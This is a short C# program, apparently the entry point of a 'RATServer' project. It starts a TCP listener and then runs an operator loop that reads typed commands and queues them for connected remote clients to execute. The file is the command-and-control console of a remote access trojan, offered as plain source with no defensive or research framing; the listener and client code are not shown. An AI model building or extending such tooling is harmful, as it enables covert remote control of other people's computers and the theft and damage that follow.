using GeneralPurposeLib;
using RATServer;

// Init everything
Logger.Init(LogLevel.Debug);

// Run logic
// bool run = true;
// Console.CancelKeyPress += (sender, eventArgs) => {
//     eventArgs.Cancel = true;
//     Logger.Info("Stopping...");
//     run = false;
// };

// Start a TCP server
RatServerListener.CommandsToRun.Add("init");
Task socketListenerTask = RatServerListener.StartListening();

// Get commands
while (true) {
    Console.Write("Enter command: ");
    string command = Console.ReadLine() ?? "";
    if (command == "exit") {
        break;
    }
    RatServerListener.CommandsToRun.Add(command);
}

Logger.Info("Exiting...");